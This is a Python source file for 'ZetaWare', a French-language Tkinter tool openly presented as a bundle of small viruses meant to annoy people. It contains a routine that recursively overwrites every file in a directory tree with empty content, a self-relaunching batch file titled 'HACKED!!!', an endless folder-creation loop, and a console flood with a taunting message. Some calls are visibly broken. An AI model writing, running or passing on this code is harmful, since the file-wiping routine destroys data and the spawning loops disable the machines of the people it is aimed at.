# -*- coding: utf-8 -*-
from genericpath import isfile
from tkinter import IntVar, Tk, Menu, Button, Toplevel
from webbrowser import open as open_link
from os import listdir, makedirs, path
from subprocess import call

__all__ = ["ZW", "add_virus", "start", "path"]

class defaultEvent:
  def __init__(self, content): print("Init test")
  def run(self, values): print("Run test")


class Item:
  def __init__(self, name, id, command, content):
    self.name = name
    self.id = id
    self.command = command
    self.instance = None
    self.content = content

class ZW:
  appName = "ZetaWare"
  path = __file__[:__file__.rindex('\\')]+'\\'
  items = []
    
  def add_virus(self, name, command=defaultEvent):
    new = Item(name, len(self.items), command, Toplevel())
    self.items.append(new)
    return new.content

  def main(self):
    self.selected = self.items[self.mode.get()]
    self.root.title(self.appName+" - mode : "+self.selected.name)
    self.instance = self.selected.command(self.selected.content)
    self.selected.content.master = self.root
    #self.selected.content.pack()
    
  def run(self):
    self.root.destroy()
    self.instance.run({})

  def start(self):
    self.root, self.mode = Tk(), IntVar()
    self.mode.set(1)
    menuBar = Menu(self.root)
    menuConfig = Menu(menuBar, tearoff=False)

    self.root.title(self.appName)
    
    self.root.iconbitmap(self.path+"icon.ico")
    self.root.geometry("500x500")
    self.root.minsize(500, 500)
    self.root.resizable(False, True)

    for i in self.items: 
        menuConfig.add_radiobutton(label=i.name, variable=self.mode, value=i.id, command=self.main)
    menuBar.add_cascade(label="Mode", menu=menuConfig)
    
    ext = Menu(menuBar, tearoff=False)
    ext.add_command(label="1. Choisissez le mode de virus que vous voulez dans le menu 'Mode'. (par défaut: videur de fichier)")
    ext.add_command(label="2. Configurez comme bon vous semble le virus avec les options proposées.")
    ext.add_command(label="3. Lancez le virus avec les options choisi en cliquant sur 'Terminer la configuration' puis 'Run'.")
    menuBar.add_cascade(label="Aide", menu=ext)
    ext = Menu(menuBar, tearoff=False)
    ext.add_command(label="ZetaWare est un logiciel libre créé par un passionner de programmation")
    ext.add_command(label="qui aime bien faire des programmes pour aider ou embêter les gens =).")
    ext.add_command(label="Cliquez pour accéder à la page GitHub du projet", command=lambda: open_link("https://github.com/ZetaMap/ZetaWare"))
    menuBar.add_cascade(label="À propos", menu=ext)

    Button(self.root, text="Terminer la configuration", command=self.run).pack(side="bottom", fill='y')
    self.root.config(menu=menuBar)
    self.main()
    self.root.mainloop()


##### Contenu #####

class videur:
  """Permet de vider toute une arborescence de fichier
  """

  def __init__(self, content):
    pass

  def run(self, values):
    try: self.loop()
    except Exception as e: input(u"""Une erreur inatendue s'est produite.
{}\n
Appuyez sur une touche pour continuer... """.format(str(e).split(':')[0]))
    
  def loop(self, target, dir=".\\"):
    for item in listdir(target):
      if isfile(target+item):
        try:
          with open(target+item, "wt") as file: file.write('')
          file.close()
          print(u"Fichier vidé à : "+dir+item)
        except OSError as e: 
          print(u"Erreur lors du vidage du fichier : {}\n{}".format(dir, str(e).split(':')[0]))
      try: self.loop(target+item+"\\", dir+item+"\\")
      except OSError as e: pass


class saturateur:
  def __init__(self, content):
    pass

  def run(self, values):
    print(10*'\n'+u"Chehh !! Tu t'est fait avoir ! \n\nBon rien de grave, ce programme n'est pas bien méchant, c'était juste pour te montrer que tout le monde peut se faire avoir en cliquant sur tout et n'importe quoi sans savoir ce que c'est vraiment. \n\nFranchement... J'espère que tu feras attention maintenant. \nEt puis ce programme n'était pas bien compliqué... \nJuste 3,4 lignes de code, comme quoi, personne n'est infaillible ;). \n\nBon et si tu veux fermer ce programme, ce n'est pas bien compliqué, tu as juste à faire la commande : CTRL+Z | CTRL+C, ou alors juste fermer cette fenêtre. \n\nSi tu y arrive bien sûr XD."+7*'\n')
    for i in range(999999999): print()
    #USER_LICENCE: Ce programme a été conssue suite à une commande, nous ne sommes pas tenues responsables des actes et conséquences de l'utilisation de ce dernier, sous aucune forme de juridiction.


class spam_console:
  def __init__(self, content):
    pass

  def run(self, values):
    with open(ZW.path+"README.bat", "wt") as file: file.write("""echo off
title HACKED!!!
start README.bat
pause""".format(ZW.path))
    file.close()
    call(""+ZW.path+"README.bat", cwd=ZW.path)
    

class spam_dossier:
  def __init__(self, content):
    pass

  def run(self, values):
    num = 0
    while True: 
      makedirs(path+"hacked"+str(num))
      num += 1



##### Init #####

if __name__ == '__main__':
  print(u"""Bienvenue dans ZetaWare, un petit logiciel qui regroupe plein de petit virus.
Ces derniers ne sont pas très méchant, bien qu'un peut énervant, mais pas de gros virus destructeur de PC.
------------------------------------------
Pour lancer la configuration appuyez sur ENTRÉE... """)
  try: input()
  except SyntaxError: pass
  ZW = ZW()
    
  ZW.add_virus("<test>")
  ZW.add_virus("Videur de fichier", videur)
  ZW.add_virus("Saturateur de RAM", saturateur)
  ZW.add_virus("Spam de console", spam_console)
  ZW.add_virus("Spam de dossier", spam_dossier)
    
  ZW.start()
